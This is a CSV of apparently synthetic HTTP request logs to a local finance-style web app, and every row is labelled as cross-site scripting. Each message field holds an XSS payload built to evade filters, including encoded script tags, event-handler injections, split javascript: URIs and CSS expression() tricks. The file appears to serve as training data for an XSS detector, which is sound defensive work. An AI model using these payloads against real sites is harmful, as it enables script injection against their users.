mimetype,timestamp,request_uri,user_ip,content_length,request_type,user_agent,message,is_xss
"text/plain, image/png, application/json, */*",6116237085763581626,http://127.0.0.1:5000/capital/jv41zdja,10.57.77.134,22721,POST,Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727),"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",true
"text/plain, */*",8418928536796656273,http://127.0.0.1:5000/account/4ynij9id,10.250.43.215,87495,GET,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.8810.3391 Safari/537.36 Edge/18.14383","<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",true
"application/json, */*",4354751854705530097,http://127.0.0.1:5000/equity/amw4zq70,10.96.197.181,76330,GET,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3",\x3Cscript>javascript:alert(1)</script>,true
"image/png, text/html, image/jpeg, */*",6761197935208297661,http://127.0.0.1:5000/dividend/zamv4eue,10.79.212.132,24239,GET,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",true
"image/png, text/plain, text/html, image/jpeg, */*",3207506020712817726,http://127.0.0.1:5000/deposit/47yfqdmy,10.123.232.234,75189,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; en-us) AppleWebKit/532.0+ (KHTML, like Gecko) Version/4.0.3 Safari/531.9.2009",<script>javascript:alert(1)</script\x0D,true
"image/jpeg, */*",3233158116026992047,http://127.0.0.1:5000/balance/xguxt70p,10.22.215.192,29403,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",<script>javascript:alert(1)</script\x0A,true
"text/plain, */*",365350298127220445,http://127.0.0.1:5000/loan/ul32ewe1,10.218.20.41,11363,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",<script>javascript:alert(1)</script\x0B,true
"image/jpeg, */*",2128130846884919621,http://127.0.0.1:5000/loan/octcxepp,10.135.171.34,68260,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0","<script charset=""\x22>javascript:alert(1)</script>",true
"image/png, image/jpeg, text/plain, */*",4981557499956488387,http://127.0.0.1:5000/capital/9fbswl6i,10.196.141.75,79437,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_4; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1 Safari/525.13",<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,true
"text/html, */*",2920757146530785528,http://127.0.0.1:5000/transaction/u0ldrkvd,10.154.61.147,44502,PUT,"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1",--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,true
"text/html, text/plain, */*",8903906665443726275,http://127.0.0.1:5000/portfolio/cdafe7nu,10.76.5.119,92426,POST,Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1) Gecko/20060918 Firefox/2.0b2,--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,true
"text/plain, image/jpeg, */*",2242621882843362788,http://127.0.0.1:5000/dividend/qwcw5qcg,10.104.183.232,25829,DELETE,Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C),--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,true
"application/json, text/plain, */*",814765740758816824,http://127.0.0.1:5000/account/ulreroog,10.146.133.87,58196,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,true
"text/plain, image/jpeg, */*",2812467775063213179,http://127.0.0.1:5000/loan/6mbn21rq,10.238.223.169,60227,GET,Opera/9.62 (X11; Linux i686; U; Linux Mint; en) Presto/2.1.1,"`""'><img src='#\x27 onerror=javascript:alert(1)>",true
"image/jpeg, image/png, text/plain, application/json, */*",8234484355483993711,http://127.0.0.1:5000/loan/qdihs0r4,10.169.81.241,17659,CONNECT,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/jpeg, image/png, text/html, */*",4622744828635203939,http://127.0.0.1:5000/loan/sf2imdja,10.113.198.242,58299,POST,Mozilla/5.0 (X11; U; DragonFly i386; de; rv:1.9.1) Gecko/20090720 Firefox/3.5.1,"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",true
"image/png, text/plain, */*",5689960439992655729,http://127.0.0.1:5000/loan/6wwouaj0,10.123.71.73,60279,GET,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; it-it) AppleWebKit/523.10.6 (KHTML, like Gecko) Version/3.0.4 Safari/523.10.6","<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, */*",8156198950837329900,http://127.0.0.1:5000/credit/mpy65j0j,10.241.103.204,58393,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fi-fi) AppleWebKit/420+ (KHTML, like Gecko) Safari/419.3","<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/html, */*",9212797144540329561,http://127.0.0.1:5000/deposit/ufxkj175,10.192.156.199,36087,POST,Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.10) Gecko/20100915 Ubuntu/9.10 (karmic) Firefox/3.6.10,"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"application/json, */*",3016799959031811438,http://127.0.0.1:5000/credit/g3bloowj,10.143.153.78,43078,GET,Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1),"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, */*",4006384898260541515,http://127.0.0.1:5000/stock/eq8lc8ny,10.48.90.19,53627,GET,Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.8.1.20) Gecko/20090108 Firefox/2.0.0.20,"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, image/jpeg, */*",6353751194498220922,http://127.0.0.1:5000/interest/cw3y95ik,10.149.91.102,20732,POST,Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0),"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/jpeg, */*",4936370615951874750,http://127.0.0.1:5000/dividend/qn54lny4,10.177.196.215,4979,POST,Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9a1) Gecko/20060127 Firefox/1.6a1,"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, text/plain, application/json, */*",3436056469526282200,http://127.0.0.1:5000/credit/lc6z4vhu,10.142.189.136,52254,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/plain, */*",2202721964455254804,http://127.0.0.1:5000/loan/vwzu352e,10.186.140.142,4862,POST,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E),"<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"application/json, */*",7022897976885204552,http://127.0.0.1:5000/capital/rw09e9w0,10.29.97.231,15430,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; ja-jp) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10","<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, */*",1170281035349909910,http://127.0.0.1:5000/interest/2mi4y74a,10.49.64.67,8853,POST,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4pre) Gecko/20070509 Firefox/2.0.0.4pre (Swiftfox),"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"application/json, text/plain, image/png, */*",7392924980045235184,http://127.0.0.1:5000/credit/4rojddtm,10.134.99.143,77541,GET,Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729),"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/plain, */*",3593036546685264911,http://127.0.0.1:5000/loan/k4qoewdb,10.48.181.200,75033,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577","<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/plain, application/json, image/png, */*",2853705642891160680,http://127.0.0.1:5000/debit/dm3apukt,10.54.34.187,55535,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729; .NET4.0E),"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/html, text/plain, image/png, */*",3506555877688448057,http://127.0.0.1:5000/account/p8m4kvln,10.4.223.3,16791,POST,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN),<script>/* *\x2A/javascript:alert(1)// */</script>,true
"image/jpeg, application/json, image/png, */*",2626365696661355663,http://127.0.0.1:5000/transaction/0ccf80ww,10.137.117.29,47662,POST,Mozilla/5.0 (Windows; U; Windows NT 5.0; rv:1.7.3) Gecko/20040913 Firefox/0.10,<script>/* *\x00/javascript:alert(1)// */</script>,true
"text/html, */*",6726378143015856641,http://127.0.0.1:5000/fund/j00wxsfs,10.216.246.23,99748,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582","<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"application/json, */*",5195772594411541342,http://127.0.0.1:5000/balance/z2zf1utj,10.75.2.180,7354,PUT,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16","<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"application/json, text/plain, text/html, */*",3323540269511824906,http://127.0.0.1:5000/account/rdqhb2hr,10.103.177.10,14758,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20041001 Firefox/0.10.1,"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"image/jpeg, text/html, text/plain, application/json, */*",7561910523151057376,http://127.0.0.1:5000/interest/k2bm9gqb,172.31.19.195,45168,GET,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20080703 Mandriva/2.0.0.17-1.1mdv2008.1 (2008.1) Firefox/2.0.0.17,"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"image/png, application/json, text/plain, text/html, */*",4765818906738469559,http://127.0.0.1:5000/portfolio/d9zdjrqj,10.63.196.77,85380,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0","<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"image/png, image/jpeg, application/json, text/plain, */*",69216709785123745,http://127.0.0.1:5000/loan/h8xki69t,10.5.114.114,56567,GET,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",true
"image/jpeg, image/png, application/json, */*",7518272020319381692,http://127.0.0.1:5000/credit/akqzv619,10.21.146.186,94415,POST,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30","""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",true
"application/json, text/html, */*",9098430625078745993,http://127.0.0.1:5000/equity/qighgr30,10.156.130.211,96162,POST,Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0),%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,true
"application/json, text/html, */*",559174113756415407,http://127.0.0.1:5000/mortgage/7yf95if2,10.175.180.55,48756,POST,"Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5","<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",true
"application/json, text/html, text/plain, image/jpeg, */*",4675011455801490143,http://127.0.0.1:5000/balance/54qyf7f1,10.54.45.96,50336,POST,Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01,"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",true
"image/png, */*",1096347189685623986,http://127.0.0.1:5000/loan/emdv4fsk,10.233.254.125,92801,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",true
"text/plain, image/png, */*",3028020022607945643,http://127.0.0.1:5000/market/tu8a9qc2,10.106.84.140,71493,POST,Opera/9.61 (Windows NT 6.0; U; en) Presto/2.1.1,"'`""><\x3Cscript>javascript:alert(1)</script>",true
"application/json, */*",4447728546998588356,http://127.0.0.1:5000/loan/7kmap2f0,10.145.205.163,54494,GET,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; nl-nl) AppleWebKit/416.11 (KHTML, like Gecko) Safari/312","'`""><\x00script>javascript:alert(1)</script>",true
"application/json, text/plain, image/jpeg, */*",3153980389989755638,http://127.0.0.1:5000/deposit/bcxxrv0f,10.158.223.171,31933,POST,Mozilla/4.0 (compatible; MSIE 6.1; Windows XP),"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",true
"text/html, */*",6923729461413912978,http://127.0.0.1:5000/loan/txkxcjsk,10.230.167.235,93620,POST,Mozilla/4.0 (MSIE 6.0; Windows NT 5.1),"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",true
"image/png, image/jpeg, text/plain, text/html, */*",8954463028784484487,http://127.0.0.1:5000/loan/k7zt548k,10.112.149.234,34517,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.152.0 Safari/525.19","<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",true
"image/jpeg, */*",7154758125841298897,http://127.0.0.1:5000/debit/7s2x0jks,172.29.18.90,34935,POST,Mozilla/4.0 (compatible; MSIE 5.00; Windows 98),"<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",true
"text/html, application/json, image/jpeg, text/plain, */*",4225820482479563169,http://127.0.0.1:5000/credit/rxtu90zn,10.180.157.171,89213,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/125.4 (KHTML, like Gecko) Safari/125.9","<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",true
"image/png, image/jpeg, application/json, */*",6959600832671188304,http://127.0.0.1:5000/interest/bnw1edns,10.127.61.106,62268,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",true
"text/html, */*",8700975611016182537,http://127.0.0.1:5000/loan/twfzv53j,10.14.20.95,48890,POST,Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.54,"<script\x20type=""text/javascript"">javascript:alert(1);</script>",true
"application/json, image/png, text/plain, */*",9170045450045324753,http://127.0.0.1:5000/portfolio/617qkrsl,10.187.228.157,90884,GET,Opera/7.54 (Windows 98; U)  [de],"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",true
"application/json, text/plain, image/png, */*",1214445125720887855,http://127.0.0.1:5000/loan/jad42o7e,172.25.229.29,64684,POST,Mozilla/5.0 (X11; U; Linux i686; sk; rv:1.9.1) Gecko/20090630 Fedora/3.5-1.fc11 Firefox/3.0,"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",true
"text/plain, application/json, image/png, */*",8937164638937987407,http://127.0.0.1:5000/interest/fdvtcppi,10.116.251.229,67199,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16","<script\x09type=""text/javascript"">javascript:alert(1);</script>",true
"text/plain, image/jpeg, application/json, */*",754313344365808643,http://127.0.0.1:5000/portfolio/bva59xha,10.16.184.18,60705,GET,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20050814 Firefox/1.0,"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",true
"text/plain, image/jpeg, text/html, image/png, */*",1403572560061735056,http://127.0.0.1:5000/interest/uvy4ruin,10.73.69.43,68155,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; en-gb) AppleWebKit/528.4+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2","<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",true
"text/plain, image/jpeg, */*",9056701745052937982,http://127.0.0.1:5000/loan/ygwjvltq,10.69.12.162,82749,GET,"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.0 Safari/534.3","<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",true
"image/jpeg, text/plain, application/json, */*",7057092147060146287,http://127.0.0.1:5000/balance/ssyluasy,10.141.248.249,38210,DELETE,"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13","ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",true
"image/jpeg, text/html, text/plain, application/json, */*",2703759417007648819,http://127.0.0.1:5000/stock/16ih2kj8,10.245.17.254,89270,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16","ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",true
"text/plain, */*",3223673866101045083,http://127.0.0.1:5000/interest/qh3lfwdb,10.107.226.129,3682,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; es-es) AppleWebKit/312.5.2 (KHTML, like Gecko) Safari/312.3.3","ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",true
"text/html, image/png, text/plain, application/json, */*",633695081351595919,http://127.0.0.1:5000/mortgage/nr1170ll,10.139.75.18,67230,POST,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.10) Gecko/2009042523 Linux Mint/6 (Felicia) Firefox/3.0.10,"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",true
"image/png, text/plain, application/json, image/jpeg, */*",4679393228988194172,http://127.0.0.1:5000/portfolio/vzfbkzo1,10.221.191.245,4842,GET,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",true
"text/plain, application/json, text/html, */*",2584302693219710247,http://127.0.0.1:5000/interest/7alwa34f,10.240.220.136,19814,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.6) Gecko/20050321 Firefox/1.0.2,"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",true
"text/html, image/jpeg, application/json, text/plain, */*",534679826588745601,http://127.0.0.1:5000/fund/4dotkyqa,10.69.152.169,91132,POST,Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62,"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",true
